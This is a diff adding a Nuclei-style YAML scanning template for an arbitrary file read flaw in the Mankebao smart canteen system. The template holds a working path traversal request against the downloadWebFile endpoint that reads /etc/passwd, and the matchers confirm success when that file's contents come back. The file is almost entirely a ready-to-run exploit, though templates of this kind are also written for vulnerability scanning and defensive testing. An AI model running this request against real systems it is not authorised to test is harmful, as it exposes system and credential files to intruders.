@@ -1,0 +1,30 @@
+id: poc-yaml-mankebao-downloadwebfile-anyfile-read
+info:
+  name: 满客宝智慧食堂系统 downloadWebFile 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - raw:
+      - |
+        GET /base/api/v1/kitchenVideo/downloadWebFile.swagger?fileName=a&ossKey=/../../../../../../../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:"
+          - "/bin"
+        part: body
+      - type: word
+        words:
+          - "filename="
+        part: header
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
